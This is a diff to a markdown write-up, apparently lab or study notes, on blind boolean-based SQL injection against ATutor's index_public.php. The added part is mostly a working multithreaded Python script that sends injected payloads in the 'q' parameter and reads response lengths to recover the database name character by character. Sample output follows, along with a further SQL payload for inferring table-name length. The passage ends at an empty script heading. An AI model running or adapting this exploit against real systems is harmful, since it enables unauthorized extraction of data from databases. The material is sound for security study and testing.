@@ -108,3 +108,76 @@
 > [+] Database Version:  atutor
 > [+] Done
 > ```
+
+> - Script (Multi-threaded and Multi-Processed)(Fast):
+> ```python
+> import requests
+> import concurrent.futures
+>
+> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
+> final_string = {}
+>
+> def db_length(number):
+>     payload = f"te')/**/or/**/(length(database()))={number}#"
+>     param = {'q': payload}
+>     r = requests.get(target, param)
+>     content_length = int(r.headers['Content-length'])
+>     if content_length > 20:
+>         return number
+>
+>     
+> def atutor_dbRetrieval(l):
+>     for j in range(32, 256):
+>         payload = f"te')/**/or/**/(select/**/ascii(substring(database(),{l},1))={j})#"
+>         param = {'q': payload}
+>         r = requests.get(target, param)
+>         content_length = int(r.headers['Content-length'])
+>         if content_length > 20:
+>             final_string[l-1] = chr(j)
+>             print(''.join(final_string[i] for i in sorted(final_string.keys())))
+>             
+>
+>
+> if __name__ == "__main__":
+>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
+>     
+>     db_len = 0
+>     with concurrent.futures.ProcessPoolExecutor() as executor:
+>         results = [executor.submit(db_length, _) for _ in range(30)]
+>         
+>         for f in concurrent.futures.as_completed(results):
+>             if f.result() != None:
+>                 db_len = f.result()
+>     print(db_len)
+>         
+>     print("[+] Retrieving Database name: ....")
+>     with concurrent.futures.ThreadPoolExecutor() as executor:
+>         results = [executor.submit(atutor_dbRetrieval, index) for index in range(db_len+1)]
+>
+>     print("[+] Database Name: ", end=" ")
+>     print(''.join(final_string[i] for i in sorted(final_string.keys())))
+>     print("[+] Done")
+> ```
+> ```
+> Output:
+> python .\atutor_dbRetrieval-fast.py
+> [*] Retreiving Database Length:
+> [*] Database length:  6
+> [+] Retrieving Database name: ....
+> a
+> ao
+> aor
+> ator
+> attor
+> atutor
+> [+] Database Name:  atutor
+> [+] Done
+> ```
+
+- Retrieving the length of table name:
+> - Payload:
+> ```sql
+> ' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 4 --+
+> ```
+> - Script:
+> 
